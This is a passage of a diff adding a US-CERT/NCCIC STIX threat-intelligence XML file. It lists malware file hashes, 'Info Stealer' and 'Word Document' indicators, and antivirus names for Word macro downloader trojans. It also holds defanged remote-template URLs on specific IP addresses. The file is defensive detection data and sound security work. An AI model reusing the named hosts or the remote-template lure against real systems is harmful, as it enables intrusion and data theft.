+                <cybox:Properties xsi:type="FileObj:FileObjectType">
+                    <FileObj:Hashes>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value condition="Equals">3ceb153fcd9407c92b3c71eb0acf74e681691b98</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                    </FileObj:Hashes>
+                </cybox:Properties>
+            </cybox:Object>
+        </cybox:Observable>
+        <cybox:Observable id="NCCIC:Observable-efd80020-fc43-42a1-a6ae-a928d5d04f5e">
+            <cybox:Object id="NCCIC:File-1d8eabc8-2d5b-410b-85c6-72dcd0a8663b">
+                <cybox:Properties xsi:type="FileObj:FileObjectType">
+                    <FileObj:Hashes>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value condition="Equals">722154a36f32ba10e98020a8ad758a7a</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                    </FileObj:Hashes>
+                </cybox:Properties>
+            </cybox:Object>
+        </cybox:Observable>
+        <cybox:Observable id="NCCIC:Observable-63d0f9c4-4c09-4364-87be-b5cbfeb1d828">
+            <cybox:Object id="NCCIC:File-8a251562-c221-47ca-9f6e-257e4551dcca">
+                <cybox:Properties xsi:type="FileObj:FileObjectType">
+                    <FileObj:Hashes>
+                        <cyboxCommon:Hash>
+                            <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                            <cyboxCommon:Simple_Hash_Value condition="Equals">2872dcdf108563d16b6cf2ed383626861fc541d2</cyboxCommon:Simple_Hash_Value>
+                        </cyboxCommon:Hash>
+                    </FileObj:Hashes>
+                </cybox:Properties>
+            </cybox:Object>
+        </cybox:Observable>
+        <cybox:Observable id="NCCIC:Observable-f67a2431-1132-45bb-9073-12700e802b82">
+            <cybox:Object id="NCCIC:URI-11f571f5-2615-4de6-b2c7-81bae367fc65">
+                <cybox:Properties xsi:type="URIObj:URIObjectType" type="URL">
+                    <URIObj:Value>file[:]//62.8.193.206/Normal.dotm</URIObj:Value>
+                </cybox:Properties>
+                <cybox:Related_Objects>
+                    <cybox:Related_Object idref="NCCIC:Address-aaf2ca99-8d03-424a-99c1-3fc0c28039c5">
+                        <cybox:Relationship xsi:type="cyboxVocabs:ObjectRelationshipVocab-1.1">Related_To</cybox:Relationship>
+                    </cybox:Related_Object>
+                </cybox:Related_Objects>
+            </cybox:Object>
+        </cybox:Observable>
+        <cybox:Observable id="NCCIC:Observable-7c092b3f-3180-47ab-8eac-172f200d9abe">
+            <cybox:Object id="NCCIC:URI-1423fd72-6be5-42c2-880d-3a619c0eee50">
+                <cybox:Properties xsi:type="URIObj:URIObjectType" type="URL">
+                    <URIObj:Value>file[:]//5.153.58.45/Normal.dotm</URIObj:Value>
+                </cybox:Properties>
+                <cybox:Related_Objects>
+                    <cybox:Related_Object idref="NCCIC:Address-128e935f-1bf5-4a22-8e68-268dcdb963b9">
+                        <cybox:Relationship xsi:type="cyboxVocabs:ObjectRelationshipVocab-1.1">Related_To</cybox:Relationship>
+                    </cybox:Related_Object>
+                </cybox:Related_Objects>
+            </cybox:Object>
+        </cybox:Observable>
+    </stix:Observables>
+    <stix:Indicators>
+        <stix:Indicator id="NCCIC:indicator-b02da848-ae84-4e88-a240-775ceb1652f7" timestamp="2017-06-21T13:21:22.901619+00:00" xsi:type='indicator:IndicatorType'>
+            <indicator:Title>Info Stealer - MD5</indicator:Title>
+            <indicator:Type>Malware Artifacts</indicator:Type>
+            <indicator:Observable id="NCCIC:Observable-67f2dcb0-9bf0-4bbf-ab3c-a26d6d6c1163">
+                <cybox:Object idref="NCCIC:File-7aca56f1-e36d-4e91-bfae-3ccae5faebff"/>
+            </indicator:Observable>
+            <indicator:Producer>
+                <stixCommon:Identity>
+                    <stixCommon:Name>US-CERT</stixCommon:Name>
+                </stixCommon:Identity>
+                <stixCommon:Time>
+                    <cyboxCommon:Produced_Time>2017-06-21T13:21:22.902690+00:00</cyboxCommon:Produced_Time>
+                </stixCommon:Time>
+            </indicator:Producer>
+        </stix:Indicator>
+        <stix:Indicator id="NCCIC:indicator-7d5e7153-3269-49e4-b0e7-a96ebc151414" timestamp="2017-06-21T13:21:22.902945+00:00" xsi:type='indicator:IndicatorType'>
+            <indicator:Title>Info Stealer - SHA1</indicator:Title>
+            <indicator:Type>Malware Artifacts</indicator:Type>
+            <indicator:Observable id="NCCIC:Observable-1521fcf3-b60a-46a2-9db6-1d884953da1e">
+                <cybox:Object idref="NCCIC:File-9ed06aa1-23a5-4b22-a1c8-d57d7d246611"/>
+            </indicator:Observable>
+            <indicator:Producer>
+                <stixCommon:Identity>
+                    <stixCommon:Name>US-CERT</stixCommon:Name>
+                </stixCommon:Identity>
+                <stixCommon:Time>
+                    <cyboxCommon:Produced_Time>2017-06-21T13:21:22.903834+00:00</cyboxCommon:Produced_Time>
+                </stixCommon:Time>
+            </indicator:Producer>
+        </stix:Indicator>
+        <stix:Indicator id="NCCIC:indicator-8596826c-35fc-4fc5-9f01-d1b109a518f4" timestamp="2017-06-21T13:21:31.238927+00:00" xsi:type='indicator:IndicatorType'>
+            <indicator:Title>Info Stealer - MD5</indicator:Title>
+            <indicator:Type>Malware Artifacts</indicator:Type>
+            <indicator:Observable id="NCCIC:Observable-b929a907-8a32-45a2-996a-95b1ccad7431">
+                <cybox:Object idref="NCCIC:File-7b50c325-93b8-4fec-8837-79042db4a642"/>
+            </indicator:Observable>
+            <indicator:Producer>
+                <stixCommon:Identity>
+                    <stixCommon:Name>US-CERT</stixCommon:Name>
+                </stixCommon:Identity>
+                <stixCommon:Time>
+                    <cyboxCommon:Produced_Time>2017-06-21T13:21:31.240025+00:00</cyboxCommon:Produced_Time>
+                </stixCommon:Time>
+            </indicator:Producer>
+        </stix:Indicator>
+        <stix:Indicator id="NCCIC:indicator-85909848-741c-4ab1-8798-6cba05b551d3" timestamp="2017-06-21T13:21:31.240289+00:00" xsi:type='indicator:IndicatorType'>
+            <indicator:Title>Info Stealer - SHA1</indicator:Title>
+            <indicator:Type>Malware Artifacts</indicator:Type>
+            <indicator:Observable id="NCCIC:Observable-1b3ae2a0-d344-43b3-b118-9081c1458db4">
+                <cybox:Object idref="NCCIC:File-e5250abb-668f-4e41-aab8-d0edd27475f8"/>
+            </indicator:Observable>
+            <indicator:Producer>
+                <stixCommon:Identity>
+                    <stixCommon:Name>US-CERT</stixCommon:Name>
+                </stixCommon:Identity>
+                <stixCommon:Time>
+                    <cyboxCommon:Produced_Time>2017-06-21T13:21:31.241209+00:00</cyboxCommon:Produced_Time>
+                </stixCommon:Time>
+            </indicator:Producer>
+        </stix:Indicator>
+        <stix:Indicator id="NCCIC:indicator-e484fc6f-26bb-46af-a343-e0bac75e55b4" timestamp="2017-06-21T13:21:38.551912+00:00" xsi:type='indicator:IndicatorType'>
+            <indicator:Title>Info Stealer - MD5</indicator:Title>
+            <indicator:Type>Malware Artifacts</indicator:Type>
+            <indicator:Observable id="NCCIC:Observable-311d8488-6bc2-4803-b528-faf997e92321">
+                <cybox:Object idref="NCCIC:File-a46e606e-4eaa-4d7f-8f03-f43d8c7e7202"/>
+            </indicator:Observable>
+            <indicator:Producer>
+                <stixCommon:Identity>
+                    <stixCommon:Name>US-CERT</stixCommon:Name>
+                </stixCommon:Identity>
+                <stixCommon:Time>
+                    <cyboxCommon:Produced_Time>2017-06-21T13:21:38.552950+00:00</cyboxCommon:Produced_Time>
+                </stixCommon:Time>
+            </indicator:Producer>
+        </stix:Indicator>
+        <stix:Indicator id="NCCIC:indicator-bf138156-b0bb-45f7-84a3-4e61d9110b38" timestamp="2017-06-21T13:21:38.553199+00:00" xsi:type='indicator:IndicatorType'>
+            <indicator:Title>Info Stealer - SHA1</indicator:Title>
+            <indicator:Type>Malware Artifacts</indicator:Type>
+            <indicator:Observable id="NCCIC:Observable-4e09621f-4894-444d-b145-46e45381f359">
+                <cybox:Object idref="NCCIC:File-32210465-a1c1-4a16-8919-dd371e047634"/>
+            </indicator:Observable>
+            <indicator:Producer>
+                <stixCommon:Identity>
+                    <stixCommon:Name>US-CERT</stixCommon:Name>
+                </stixCommon:Identity>
+                <stixCommon:Time>
+                    <cyboxCommon:Produced_Time>2017-06-21T13:21:38.554096+00:00</cyboxCommon:Produced_Time>
+                </stixCommon:Time>
+            </indicator:Producer>
+        </stix:Indicator>
+        <stix:Indicator id="NCCIC:indicator-2fd60c28-8c11-4f41-a688-12cc472df95b" timestamp="2017-06-21T13:21:45.720825+00:00" xsi:type='indicator:IndicatorType'>
+            <indicator:Title>Info Stealer - MD5</indicator:Title>
+            <indicator:Type>Malware Artifacts</indicator:Type>
+            <indicator:Observable id="NCCIC:Observable-ece140e3-e47e-412b-884a-8f6ed3312bd9">
+                <cybox:Object idref="NCCIC:File-015318b5-1d37-47eb-8d92-c1300c8b6d5f"/>
+            </indicator:Observable>
+            <indicator:Producer>
+                <stixCommon:Identity>
+                    <stixCommon:Name>US-CERT</stixCommon:Name>
+                </stixCommon:Identity>
+                <stixCommon:Time>
+                    <cyboxCommon:Produced_Time>2017-06-21T13:21:45.721858+00:00</cyboxCommon:Produced_Time>
+                </stixCommon:Time>
+            </indicator:Producer>
+        </stix:Indicator>
+        <stix:Indicator id="NCCIC:indicator-decef631-b230-4b41-a834-5e348b6bc27b" timestamp="2017-06-21T13:21:45.722105+00:00" xsi:type='indicator:IndicatorType'>
+            <indicator:Title>Info Stealer - SHA1</indicator:Title>
+            <indicator:Type>Malware Artifacts</indicator:Type>
+            <indicator:Observable id="NCCIC:Observable-54175aa2-9cdd-4001-a676-270deb472bc9">
+                <cybox:Object idref="NCCIC:File-56e1a28f-543f-4b25-9877-f1afc8767f81"/>
+            </indicator:Observable>
+            <indicator:Producer>
+                <stixCommon:Identity>
+                    <stixCommon:Name>US-CERT</stixCommon:Name>
+                </stixCommon:Identity>
+                <stixCommon:Time>
+                    <cyboxCommon:Produced_Time>2017-06-21T13:21:45.723013+00:00</cyboxCommon:Produced_Time>
+                </stixCommon:Time>
+            </indicator:Producer>
+        </stix:Indicator>
+        <stix:Indicator id="NCCIC:indicator-85537d2c-9e5c-4a57-be60-4f357831b3bd" timestamp="2017-06-21T13:21:55.274116+00:00" xsi:type='indicator:IndicatorType'>
+            <indicator:Title>Info Stealer - MD5</indicator:Title>
+            <indicator:Type>Malware Artifacts</indicator:Type>
+            <indicator:Observable id="NCCIC:Observable-bccf3aa8-ee41-4625-99df-d73463ae9c81">
+                <cybox:Object idref="NCCIC:File-1224381d-ede8-44de-ad3a-96308078d6f7"/>
+            </indicator:Observable>
+            <indicator:Producer>
+                <stixCommon:Identity>
+                    <stixCommon:Name>US-CERT</stixCommon:Name>
+                </stixCommon:Identity>
+                <stixCommon:Time>
+                    <cyboxCommon:Produced_Time>2017-06-21T13:21:55.275180+00:00</cyboxCommon:Produced_Time>
+                </stixCommon:Time>
+            </indicator:Producer>
+        </stix:Indicator>
+        <stix:Indicator id="NCCIC:indicator-f4bf7dd2-9fcd-4912-b82d-847a15b12a8a" timestamp="2017-06-21T13:21:55.275426+00:00" xsi:type='indicator:IndicatorType'>
+            <indicator:Title>Info Stealer - SHA1</indicator:Title>
+            <indicator:Type>Malware Artifacts</indicator:Type>
+            <indicator:Observable id="NCCIC:Observable-117b585c-e711-4238-bbda-01b7897e0de9">
+                <cybox:Object idref="NCCIC:File-21f88a76-7ea4-4c1a-9ba3-6d87a1ab7511"/>
+            </indicator:Observable>
+            <indicator:Producer>
+                <stixCommon:Identity>
+                    <stixCommon:Name>US-CERT</stixCommon:Name>
+                </stixCommon:Identity>
+                <stixCommon:Time>
+                    <cyboxCommon:Produced_Time>2017-06-21T13:21:55.276309+00:00</cyboxCommon:Produced_Time>
+                </stixCommon:Time>
+            </indicator:Producer>
+        </stix:Indicator>
+        <stix:Indicator id="NCCIC:indicator-2774b283-b69b-401d-b6cd-37e44d5d2d76" timestamp="2017-06-21T13:22:02.195102+00:00" xsi:type='indicator:IndicatorType'>
+            <indicator:Title>Info Stealer - MD5</indicator:Title>
+            <indicator:Type>Malware Artifacts</indicator:Type>
+            <indicator:Observable id="NCCIC:Observable-b0b1d876-f0be-4cb3-b026-3755905584a7">
+                <cybox:Object idref="NCCIC:File-e79b4ca2-6dff-48be-88a7-dfaee54d8e6a"/>
+            </indicator:Observable>
+            <indicator:Producer>
+                <stixCommon:Identity>
+                    <stixCommon:Name>US-CERT</stixCommon:Name>
+                </stixCommon:Identity>
+                <stixCommon:Time>
+                    <cyboxCommon:Produced_Time>2017-06-21T13:22:02.196674+00:00</cyboxCommon:Produced_Time>
+                </stixCommon:Time>
+            </indicator:Producer>
+        </stix:Indicator>
+        <stix:Indicator id="NCCIC:indicator-24ade23f-fcd1-461e-8b81-fcd0b285327f" timestamp="2017-06-21T13:22:02.196934+00:00" xsi:type='indicator:IndicatorType'>
+            <indicator:Title>Info Stealer - SHA1</indicator:Title>
+            <indicator:Type>Malware Artifacts</indicator:Type>
+            <indicator:Observable id="NCCIC:Observable-4e508796-20b4-4561-a240-15fde32a83e4">
+                <cybox:Object idref="NCCIC:File-b18ccb25-2f1b-42dd-a06e-7b92c849652b"/>
+            </indicator:Observable>
+            <indicator:Producer>
+                <stixCommon:Identity>
+                    <stixCommon:Name>US-CERT</stixCommon:Name>
+                </stixCommon:Identity>
+                <stixCommon:Time>
+                    <cyboxCommon:Produced_Time>2017-06-21T13:22:02.197945+00:00</cyboxCommon:Produced_Time>
+                </stixCommon:Time>
+            </indicator:Producer>
+        </stix:Indicator>
+        <stix:Indicator id="NCCIC:indicator-52ba9b19-7eb5-4084-8670-605312d1ac75" timestamp="2017-06-21T13:23:15.324683+00:00" xsi:type='indicator:IndicatorType'>
+            <indicator:Title>Suspicious IP</indicator:Title>
+            <indicator:Type>IP Watchlist</indicator:Type>
+            <indicator:Observable id="NCCIC:Observable-8317eb85-df6a-44f7-8ba3-ed679c7f6a22">
+                <cybox:Object idref="NCCIC:Address-a3145850-da1e-4b05-b8d9-ab065416fad5"/>
+            </indicator:Observable>
+            <indicator:Producer>
+                <stixCommon:Identity>
+                    <stixCommon:Name>US-CERT</stixCommon:Name>
+                </stixCommon:Identity>
+                <stixCommon:Time>
+                    <cyboxCommon:Produced_Time>2017-06-21T13:23:15.326007+00:00</cyboxCommon:Produced_Time>
+                </stixCommon:Time>
+            </indicator:Producer>
+        </stix:Indicator>
+        <stix:Indicator id="NCCIC:indicator-492340a1-7c87-4119-86c2-10ffc991a71c" timestamp="2017-06-21T13:23:23.981797+00:00" xsi:type='indicator:IndicatorType'>
+            <indicator:Title>Suspicious IP</indicator:Title>
+            <indicator:Type>IP Watchlist</indicator:Type>
+            <indicator:Observable id="NCCIC:Observable-06f89156-7ae1-4147-8323-384de3a6ed08">
+                <cybox:Object idref="NCCIC:Address-540666db-d4d1-464c-9268-904062ee3aea"/>
+            </indicator:Observable>
+            <indicator:Producer>
+                <stixCommon:Identity>
+                    <stixCommon:Name>US-CERT</stixCommon:Name>
+                </stixCommon:Identity>
+                <stixCommon:Time>
+                    <cyboxCommon:Produced_Time>2017-06-21T13:23:23.982966+00:00</cyboxCommon:Produced_Time>
+                </stixCommon:Time>
+            </indicator:Producer>
+        </stix:Indicator>
+        <stix:Indicator id="NCCIC:indicator-819f9892-7b55-43d5-807b-d3145c7ef14f" timestamp="2017-10-13T16:21:44.075237+00:00" xsi:type='indicator:IndicatorType'>
+            <indicator:Title>Word Document - MD5</indicator:Title>
+            <indicator:Type>Malware Artifacts</indicator:Type>
+            <indicator:Observable id="NCCIC:Observable-1a53f0f9-49f1-4475-ad75-b5485bd869ea">
+                <cybox:Object idref="NCCIC:File-5b18d790-a4af-4a73-836d-567cfac27b3f"/>
+            </indicator:Observable>
+            <indicator:Producer>
+                <stixCommon:Identity>
+                    <stixCommon:Name>US-CERT</stixCommon:Name>
+                </stixCommon:Identity>
+                <stixCommon:Time>
+                    <cyboxCommon:Produced_Time>2017-10-13T16:21:44.076575+00:00</cyboxCommon:Produced_Time>
+                </stixCommon:Time>
+            </indicator:Producer>
+        </stix:Indicator>
+        <stix:Indicator id="NCCIC:indicator-c4b0b69e-3667-492a-b4de-aecb2afea039" timestamp="2017-10-13T16:21:44.076887+00:00" xsi:type='indicator:IndicatorType'>
+            <indicator:Title>Word Document - SHA1</indicator:Title>
+            <indicator:Type>Malware Artifacts</indicator:Type>
+            <indicator:Observable id="NCCIC:Observable-49c6560f-9e69-4af8-91be-e9e000c25014">
+                <cybox:Object idref="NCCIC:File-f5844f17-7bc0-44e5-8a22-45208efa4c52"/>
+            </indicator:Observable>
+            <indicator:Producer>
+                <stixCommon:Identity>
+                    <stixCommon:Name>US-CERT</stixCommon:Name>
+                </stixCommon:Identity>
+                <stixCommon:Time>
+                    <cyboxCommon:Produced_Time>2017-10-13T16:21:44.077867+00:00</cyboxCommon:Produced_Time>
+                </stixCommon:Time>
+            </indicator:Producer>
+        </stix:Indicator>
+        <stix:Indicator id="NCCIC:indicator-6272810d-b209-4c8b-9f89-9041c66f6560" timestamp="2017-10-13T16:22:08.782685+00:00" xsi:type='indicator:IndicatorType'>
+            <indicator:Title>Word Document - MD5</indicator:Title>
+            <indicator:Type>Malware Artifacts</indicator:Type>
+            <indicator:Observable id="NCCIC:Observable-07deef60-1697-4348-a890-7f2c1630ade6">
+                <cybox:Object idref="NCCIC:File-1d8eabc8-2d5b-410b-85c6-72dcd0a8663b"/>
+            </indicator:Observable>
+            <indicator:Producer>
+                <stixCommon:Identity>
+                    <stixCommon:Name>US-CERT</stixCommon:Name>
+                </stixCommon:Identity>
+                <stixCommon:Time>
+                    <cyboxCommon:Produced_Time>2017-10-13T16:22:08.783937+00:00</cyboxCommon:Produced_Time>
+                </stixCommon:Time>
+            </indicator:Producer>
+        </stix:Indicator>
+        <stix:Indicator id="NCCIC:indicator-310b3403-d67c-43ec-bd96-26aa77a4f78d" timestamp="2017-10-13T16:22:08.784202+00:00" xsi:type='indicator:IndicatorType'>
+            <indicator:Title>Word Document - SHA1</indicator:Title>
+            <indicator:Type>Malware Artifacts</indicator:Type>
+            <indicator:Observable id="NCCIC:Observable-0c5f949b-f5d9-433b-a307-141ce2d40591">
+                <cybox:Object idref="NCCIC:File-8a251562-c221-47ca-9f6e-257e4551dcca"/>
+            </indicator:Observable>
+            <indicator:Producer>
+                <stixCommon:Identity>
+                    <stixCommon:Name>US-CERT</stixCommon:Name>
+                </stixCommon:Identity>
+                <stixCommon:Time>
+                    <cyboxCommon:Produced_Time>2017-10-13T16:22:08.785200+00:00</cyboxCommon:Produced_Time>
+                </stixCommon:Time>
+            </indicator:Producer>
+        </stix:Indicator>
+    </stix:Indicators>
+    <stix:TTPs>
+        <stix:TTP id="NCCIC:ttp-3b176393-3525-4af9-9aa2-f18387d61686" timestamp="2017-06-21T13:39:01.456856+00:00" xsi:type='ttp:TTPType'>
+            <ttp:Title>None</ttp:Title>
+            <ttp:Behavior>
+                <ttp:Malware>
+                    <ttp:Malware_Instance xsi:type='stix-maec:MAEC4.1InstanceType'>
+                        <stix-maec:MAEC id="NCCIC:package-15311d71-4cb6-4fde-b51f-56a91ad6cafe" schema_version="2.1">
+                            <maecPackage:Malware_Subjects>
+                                <maecPackage:Malware_Subject id="NCCIC:malware_subject-04fdaa8a-7d4f-4c7d-b1b1-c6b545e3ad9d">
+                                    <maecPackage:Malware_Instance_Object_Attributes idref="NCCIC:File-b17cdc5e-e890-45ee-9817-4d1edcfb3829"/>
+                                    <maecPackage:Findings_Bundles>
+                                        <maecPackage:Bundle defined_subject="true" id="NCCIC:bundle-ce979657-b625-45e3-9924-d76a94f3424e" schema_version="4.1">
+                                            <maecBundle:AV_Classifications>
+                                                <maecBundle:AV_Classification>
+                                                    <cyboxCommon:Vendor>McAfee</cyboxCommon:Vendor>
+                                                    <maecBundle:Classification_Name>W97M/Downloader.cdg</maecBundle:Classification_Name>
+                                                </maecBundle:AV_Classification>
+                                                <maecBundle:AV_Classification>
+                                                    <cyboxCommon:Vendor>Microsoft Security Essentials</cyboxCommon:Vendor>
+                                                    <maecBundle:Classification_Name>Trojan:O97M/Inoff.A</maecBundle:Classification_Name>
+                                                </maecBundle:AV_Classification>
+                                                <maecBundle:AV_Classification>
+                                                    <cyboxCommon:Vendor>Sophos</cyboxCommon:Vendor>
+                                                    <maecBundle:Classification_Name>Troj/DocDl-JMD</maecBundle:Classification_Name>
+                                                </maecBundle:AV_Classification>
+                                            </maecBundle:AV_Classifications>
+                                        </maecPackage:Bundle>
+                                    </maecPackage:Findings_Bundles>
+                                </maecPackage:Malware_Subject>
+                            </maecPackage:Malware_Subjects>
+                        </stix-maec:MAEC>
+                    </ttp:Malware_Instance>
+                </ttp:Malware>
+            </ttp:Behavior>
+        </stix:TTP>
+        <stix:TTP id="NCCIC:ttp-b0c07b3f-992b-4dc6-be29-10d5bb8ec69d" timestamp="2017-10-13T16:56:19.326413+00:00" xsi:type='ttp:TTPType'>
+            <ttp:Title>None</ttp:Title>
+            <ttp:Behavior>
+                <ttp:Malware>
+                    <ttp:Malware_Instance xsi:type='stix-maec:MAEC4.1InstanceType'>
+                        <stix-maec:MAEC id="NCCIC:package-bb7a2484-49b5-4b6f-8660-78439d6c47e2" schema_version="2.1">
+                            <maecPackage:Malware_Subjects>
+                                <maecPackage:Malware_Subject id="NCCIC:malware_subject-b7e14098-5c1d-4b19-9e56-f5119b7d8604">
+                                    <maecPackage:Malware_Instance_Object_Attributes idref="NCCIC:File-0cb236b5-edd4-4b3b-96f6-e4ee3c7555a6"/>
+                                    <maecPackage:Findings_Bundles>
+                                        <maecPackage:Bundle defined_subject="true" id="NCCIC:bundle-e8777368-1f06-410c-a192-15e10bb8511c" schema_version="4.1">
+                                            <maecBundle:AV_Classifications>
+                                                <maecBundle:AV_Classification>
+                                                    <cyboxCommon:Vendor>McAfee</cyboxCommon:Vendor>
+                                                    <maecBundle:Classification_Name>W97M/Downloader.cdg</maecBundle:Classification_Name>
+                                                </maecBundle:AV_Classification>
+                                                <maecBundle:AV_Classification>
+                                                    <cyboxCommon:Vendor>BitDefender</cyboxCommon:Vendor>
+                                                    <maecBundle:Classification_Name>Trojan.GenericKD.12004346</maecBundle:Classification_Name>
+                                                </maecBundle:AV_Classification>
+                                                <maecBundle:AV_Classification>
+                                                    <cyboxCommon:Vendor>Microsoft Security Essentials</cyboxCommon:Vendor>
+                                                    <maecBundle:Classification_Name>Trojan:O97M/Inoff.A</maecBundle:Classification_Name>
+                                                </maecBundle:AV_Classification>
+                                                <maecBundle:AV_Classification>
+                                                    <cyboxCommon:Vendor>Sophos</cyboxCommon:Vendor>
+                                                    <maecBundle:Classification_Name>Troj/DocDl-JMD</maecBundle:Classification_Name>
+                                                </maecBundle:AV_Classification>
+                                                <maecBundle:AV_Classification>
+                                                    <cyboxCommon:Vendor>TrendMicro House Call</cyboxCommon:Vendor>
+                                                    <maecBundle:Classification_Name>TROJ_RELSLODR.D</maecBundle:Classification_Name>
+                                                </maecBundle:AV_Classification>
+                                                <maecBundle:AV_Classification>
+                                                    <cyboxCommon:Vendor>TrendMicro</cyboxCommon:Vendor>
+                                                    <maecBundle:Classification_Name>TROJ_RELSLODR.D</maecBundle:Classification_Name>
+                                                </maecBundle:AV_Classification>
+                                                <maecBundle:AV_Classification>
+                                                    <cyboxCommon:Vendor>Emsisoft</cyboxCommon:Vendor>
+                                                    <maecBundle:Classification_Name>Trojan.GenericKD.12004346 (B)</maecBundle:Classification_Name>
+                                                </maecBundle:AV_Classification>
+                                                <maecBundle:AV_Classification>
+                                                    <cyboxCommon:Vendor>Ahnlab</cyboxCommon:Vendor>
+                                                    <maecBundle:Classification_Name>DOC/Downloader</maecBundle:Classification_Name>
+                                                </maecBundle:AV_Classification>
+                                                <maecBundle:AV_Classification>
+                                                    <cyboxCommon:Vendor>ESET</cyboxCommon:Vendor>
+                                                    <maecBundle:Classification_Name>DOC/TrojanDownloader.Agent.U trojan</maecBundle:Classification_Name>
+                                                </maecBundle:AV_Classification>
+                                                <maecBundle:AV_Classification>
+                                                    <cyboxCommon:Vendor>Ikarus</cyboxCommon:Vendor>
+                                                    <maecBundle:Classification_Name>Trojan-Downloader.MSWord.Agent</maecBundle:Classification_Name>
+                                                </maecBundle:AV_Classification>
+                                            </maecBundle:AV_Classifications>
+                                        </maecPackage:Bundle>
+                                    </maecPackage:Findings_Bundles>
+                                </maecPackage:Malware_Subject>
+                            </maecPackage:Malware_Subjects>
+                        </stix-maec:MAEC>
+                    </ttp:Malware_Instance>
+                </ttp:Malware>
+            </ttp:Behavior>
+        </stix:TTP>
+        <stix:TTP id="NCCIC:ttp-c4359f96-f0b3-4236-b4e3-d6fee9914fb3" timestamp="2017-10-13T17:01:14.670868+00:00" xsi:type='ttp:TTPType'>
+            <ttp:Title>None</ttp:Title>
+            <ttp:Behavior>
+                <ttp:Malware>
+                    <ttp:Malware_Instance xsi:type='stix-maec:MAEC4.1InstanceType'>
+                        <stix-maec:MAEC id="NCCIC:package-dae87d7f-b712-42e9-9394-219976f902be" schema_version="2.1">
+                            <maecPackage:Malware_Subjects>
+                                <maecPackage:Malware_Subject id="NCCIC:malware_subject-7bb141d2-3f9d-4946-9381-94d82dc49f74">
+                                    <maecPackage:Malware_Instance_Object_Attributes idref="NCCIC:File-c84bf4e5-9672-4383-9662-60590c03b1e2"/>
+                                    <maecPackage:Findings_Bundles>
+                                        <maecPackage:Bundle defined_subject="true" id="NCCIC:bundle-66f38278-96c0-434d-95c8-2f8773a9ff9b" schema_version="4.1"/>
+                                    </maecPackage:Findings_Bundles>
+                                </maecPackage:Malware_Subject>
+                            </maecPackage:Malware_Subjects>
+                        </stix-maec:MAEC>
+                    </ttp:Malware_Instance>
+                </ttp:Malware>
+            </ttp:Behavior>
+        </stix:TTP>
+        <stix:TTP id="NCCIC:ttp-282b57a5-5d12-47aa-a1e5-f7636d944aa5" timestamp="2017-10-13T17:09:17.459271+00:00" xsi:type='ttp:TTPType'>
+            <ttp:Title>None</ttp:Title>
+            <ttp:Behavior>
+                <ttp:Malware>
+                    <ttp:Malware_Instance xsi:type='stix-maec:MAEC4.1InstanceType'>
+                        <stix-maec:MAEC id="NCCIC:package-f8e46432-5a8d-4cae-9001-1b9e2f0fe2fc" schema_version="2.1">
+                            <maecPackage:Malware_Subjects>
+                                <maecPackage:Malware_Subject id="NCCIC:malware_subject-fb3a25af-b786-4fcd-8334-ed372350ca26">
+                                    <maecPackage:Malware_Instance_Object_Attributes idref="NCCIC:File-2d7757a2-24db-4391-855e-101a4167fac5"/>
+                                    <maecPackage:Findings_Bundles>
+                                        <maecPackage:Bundle defined_subject="true" id="NCCIC:bundle-c97e5b37-acc1-4c02-b437-4f5d7a545334" schema_version="4.1">
+                                            <maecBundle:AV_Classifications>
+                                                <maecBundle:AV_Classification>
+                                                    <cyboxCommon:Vendor>McAfee</cyboxCommon:Vendor>
+                                                    <maecBundle:Classification_Name>W97M/Downloader.cdg</maecBundle:Classification_Name>
+                                                </maecBundle:AV_Classification>
+                                                <maecBundle:AV_Classification>
+                                                    <cyboxCommon:Vendor>Microsoft Security Essentials</cyboxCommon:Vendor>
+                                                    <maecBundle:Classification_Name>Trojan:O97M/Inoff.A</maecBundle:Classification_Name>
+                                                </maecBundle:AV_Classification>
+                                                <maecBundle:AV_Classification>
+                                                    <cyboxCommon:Vendor>Sophos</cyboxCommon:Vendor>
+                                                    <maecBundle:Classification_Name>Troj/DocDl-JMD</maecBundle:Classification_Name>
+                                                </maecBundle:AV_Classification>
+                                            </maecBundle:AV_Classifications>
+                                        </maecPackage:Bundle>
+                                    </maecPackage:Findings_Bundles>
+                                </maecPackage:Malware_Subject>
+                            </maecPackage:Malware_Subjects>
+                        </stix-maec:MAEC>
+                    </ttp:Malware_Instance>
+                </ttp:Malware>
+            </ttp:Behavior>
+        </stix:TTP>
+        <stix:TTP id="NCCIC:ttp-c8277d8f-0775-41bd-8ec2-e18d4a2e3e0a" timestamp="2017-10-13T17:09:35.163738+00:00" xsi:type='ttp:TTPType'>
+            <ttp:Title>None</ttp:Title>
+            <ttp:Behavior>
+                <ttp:Malware>
+                    <ttp:Malware_Instance xsi:type='stix-maec:MAEC4.1InstanceType'>
+                        <stix-maec:MAEC id="NCCIC:package-129ee0fb-e76c-4e85-8732-2a8468308583" schema_version="2.1">
+                            <maecPackage:Malware_Subjects>
+                                <maecPackage:Malware_Subject id="NCCIC:malware_subject-c7a1c3b0-a252-48ea-8273-3200193e4125">
+                                    <maecPackage:Malware_Instance_Object_Attributes idref="NCCIC:File-2436151b-190c-499d-8174-2e1ec1fb0838"/>
+                                    <maecPackage:Findings_Bundles>
+                                        <maecPackage:Bundle defined_subject="true" id="NCCIC:bundle-e1a758a9-04e1-40b9-99da-5dc3cfab7993" schema_version="4.1">
+                                            <maecBundle:AV_Classifications>
+                                                <maecBundle:AV_Classification>
+                                                    <cyboxCommon:Vendor>McAfee</cyboxCommon:Vendor>
+                                                    <maecBundle:Classification_Name>W97M/Downloader.cdg</maecBundle:Classification_Name>
+                                                </maecBundle:AV_Classification>
+                                                <maecBundle:AV_Classification>
+                                                    <cyboxCommon:Vendor>Microsoft Security Essentials</cyboxCommon:Vendor>
+                                                    <maecBundle:Classification_Name>Trojan:O97M/Inoff.A</maecBundle:Classification_Name>
+                                                </maecBundle:AV_Classification>
+                                                <maecBundle:AV_Classification>
+                                                    <cyboxCommon:Vendor>Sophos</cyboxCommon:Vendor>
